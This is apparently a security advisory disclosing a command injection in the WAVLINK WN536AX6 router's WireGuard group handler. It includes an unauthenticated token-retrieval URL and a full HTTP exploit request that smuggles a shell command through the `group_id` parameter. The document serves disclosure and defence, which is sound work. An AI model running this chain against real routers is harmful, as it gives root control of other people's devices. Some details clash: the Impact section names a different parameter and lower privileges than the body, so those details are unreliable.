# WAVLINK WN536AX6



- Vendor: WAVLINK
- Product: WN536AX6
- Firmware Version: V260507
- Vulnerability Type:Authenticated Command Injection

# Description

​		An authenticated command injection vulnerability exists in the `wireguard_cli_group` handler of `/protocol.csp` on the WAVLINK WN536AX6-A router. The vulnerability can be exploited through the attacker-controlled `group_id` and `group_name` parameters, leading to remote code execution with root privileges.  Although a valid session token is required for exploitation,  authentication can be trivially bypassed: the device ships with `FirstLogin=1` (passwordless login enabled by default), allowing an attacker to obtain a valid token with a single unauthenticated login request.

#   Impact

An authenticated attacker can inject arbitrary shell commands through the `destination` parameter and execute them with the privileges of the web service, potentially resulting in full compromise of the device.

#   Vulnerability Details

In the ioos web backend, within the `wireguard_cli_group` handler of `/protocol.csp` (`fname=net&opt=wireguard_cli_group&function=set`), the request parameters `group_id` and `group_name` are not sanitized before being directly concatenated into the shell command `uci set ovpnclient.@groups[-1].group_id='%s'`, which is then executed via `system()`. Under the device's factory default configuration (`FirstLogin=1`, which enables passwordless authentication), an attacker needs only two steps to obtain a root shell: first, send a request to `fname=system&opt=login&function=set&usrid=` to retrieve a session token; then, with the token, access the injection payload `group_id=aa" | <arbitrary command> #`, which triggers the execution of arbitrary commands with root privileges.
<img width="793" height="184" alt="图片" src="https://github.com/user-attachments/assets/2d930758-4935-4e46-80cb-43d0a8d73806" />


<img width="1143" height="632" alt="图片" src="https://github.com/user-attachments/assets/82daa1fa-d235-4450-ba2a-84156bf63e06" />


Obtain the token, then perform the exploit.

http://192.168.10.3/protocol.csp?fname=system&opt=login&function=set&usrid=

<img width="1106" height="186" alt="图片" src="https://github.com/user-attachments/assets/48787f87-8433-45ac-8422-514be2f2565b" />


拿到token，再进行漏洞利用

**exp**

```http
GET /protocol.csp?fname=net&opt=wireguard_cli_group&function=set&action=add&group_id=aa%27%3B%20touch%20%2Fwg_add_ax6%20%23&group_name=n&token=546A71377A24AA0C31928028C79ABA37 HTTP/1.1

Host: 192.168.10.3

Cookie: i18next=en_US

Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"

Accept: application/json, text/javascript, */*; q=0.01

X-Requested-With: XMLHttpRequest

Sec-Ch-Ua-Mobile: ?0

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

Sec-Ch-Ua-Platform: "Linux"

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: cors

Sec-Fetch-Dest: empty

Referer: https://192.168.10.2/

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Priority: u=1, i

Connection: close




```

# **Reproduction Results**
<img width="1176" height="179" alt="图片" src="https://github.com/user-attachments/assets/4ae29d9c-c675-4d47-a7d8-4c93e7655d6e" />




<img width="1428" height="798" alt="图片" src="https://github.com/user-attachments/assets/07fca03e-8ef7-4c53-8182-059e4e4b49ce" />

<img width="1111" height="336" alt="图片" src="https://github.com/user-attachments/assets/f3c2334c-9fff-4f53-9ada-e2ab68bbe009" />
